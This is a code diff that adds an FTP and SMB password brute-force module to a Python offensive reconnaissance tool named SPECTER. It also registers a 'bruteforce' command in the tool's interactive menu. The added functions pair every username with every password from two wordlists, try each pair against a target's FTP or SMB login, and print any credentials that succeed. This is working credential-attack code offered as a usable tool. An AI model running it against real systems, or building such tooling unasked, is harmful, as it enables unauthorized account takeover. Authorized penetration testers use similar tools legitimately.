@@ -186,6 +186,57 @@ def check_port(target_ip, port):
         print(f"[-] Error checking port {port} on {target_ip}: {e}")
         return False
 
+# FTP and SMB Brute-Force Module
+def generate_combinations(userlist_path, passlist_path):
+    """
+    Generate all username:password combinations from two files.
+    """
+    if not os.path.isfile(userlist_path) or not os.path.isfile(passlist_path):
+        print(f"[-] Userlist or passlist file does not exist.")
+        return []
+    with open(userlist_path, 'r') as uf:
+        users = [u.strip() for u in uf if u.strip()]
+    with open(passlist_path, 'r') as pf:
+        passwords = [p.strip() for p in pf if p.strip()]
+    return [(u, p) for u in users for p in passwords]
+
+def ftp_bruteforce(target_ip, userlist_path, passlist_path):
+    """
+    Attempt to brute-force FTP using username and password lists.
+    """
+    from ftplib import FTP
+    combos = generate_combinations(userlist_path, passlist_path)
+    print(f"[+] Starting FTP brute-force on {target_ip} with {len(combos)} combinations...")
+    for username, password in combos:
+        try:
+            ftp = FTP(target_ip, timeout=3)
+            ftp.login(user=username, passwd=password)
+            print(f"[+] FTP credentials found: {username}:{password}")
+            ftp.quit()
+            return (username, password)
+        except Exception:
+            continue
+    print("[-] No valid FTP credentials found.")
+    return None
+
+def smb_bruteforce(target_ip, userlist_path, passlist_path):
+    """
+    Attempt to brute-force SMB using username and password lists.
+    """
+    combos = generate_combinations(userlist_path, passlist_path)
+    print(f"[+] Starting SMB brute-force on {target_ip} with {len(combos)} combinations...")
+    for username, password in combos:
+        try:
+            conn = SMBConnection(username, password, 'SpecterClient', 'SpecterServer', use_ntlm_v2=True)
+            if conn.connect(target_ip, 445, timeout=3):
+                print(f"[+] SMB credentials found: {username}:{password}")
+                conn.close()
+                return (username, password)
+        except Exception:
+            continue
+    print("[-] No valid SMB credentials found.")
+    return None
+
 # Directory scanning
 def dirscan(base_url, wordlist_path, extensions=None, threads=10):
     """
@@ -590,6 +641,7 @@ S P E C T E R
         "dirscan": dirscan,
         "smbrecon": smb_recon,
         "subenum": subdomain_enum,
+        "bruteforce": None,
         "exit": None,
     }
 
@@ -615,6 +667,8 @@ S P E C T E R
                 print("  subenum    <domain> <wordlist>     Enumerate subdomains using a wordlist.")
                 print("\n SMB RECON")
                 print("  smbrecon   <IP>                    Enumerate SMB shares and gather metadata.")
+                print("\n BRUTE FORCE")
+                print("  bruteforce <ftp|smb> <target> <userlist> <passlist>  Attempt to brute-force FTP or SMB logins.")
                 print("\n OTHER")
                 print("  exit                               Exit the tool.")
 
@@ -648,6 +702,21 @@ S P E C T E R
                         smb_recon(args[0])
                     else:
                         print("Usage: smbrecon <IP>")
+                elif command == "bruteforce":
+                    if len(args) == 1:
+                        parts = args[0].split()
+                        if len(parts) != 4:
+                            print("Usage: bruteforce <ftp|smb> <target> <userlist> <passlist>")
+                        else:
+                            proto, target, userlist, passlist = parts
+                            if proto.lower() == "ftp":
+                                ftp_bruteforce(target, userlist, passlist)
+                            elif proto.lower() == "smb":
+                                smb_bruteforce(target, userlist, passlist)
+                            else:
+                                print("Supported protocols: ftp, smb")
+                    else:
+                        print("Usage: bruteforce <ftp|smb> <target> <userlist> <passlist>")
                 else:
                     func = commands[command]
                     if len(args) == 1:
